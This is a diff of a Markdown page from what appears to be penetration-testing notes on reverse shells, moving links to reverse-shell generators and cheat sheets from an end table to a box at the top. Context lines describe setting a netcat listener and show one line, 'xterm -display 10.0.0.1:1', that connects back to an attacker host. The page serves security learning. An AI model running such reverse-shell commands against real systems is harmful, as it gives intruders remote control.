@@ -11,6 +11,13 @@ tags:
 
 # Reverse shells
 
+??? abstract "Resources to generate reverse shells"
+    - [https://www.revshells.com/](https://www.revshells.com/)
+    - [Netcat for windows 32/64 bit](https://github.com/int0x33/nc.exe) 
+    - [Pentesmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 
+
+
 Victim's machine Initiates a connection back to a "listener" on our attacking machine box. 
 
 For this attack to work, first  we set the listener in the attacking machine using netcat.
@@ -137,11 +144,3 @@ p.waitFor()
 xterm -display 10.0.0.1:1
 ```
 
-
-## Some more resources
-
-| Reverse shell | Link to resource |
-| ------------- | ---------------- |
-| Netcat for windows 32/64 bit | [https://github.com/int0x33/nc.exe](https://github.com/int0x33/nc.exe) |
-| Pentesmonkey | [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-| PayloadsAllTheThings | [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) |
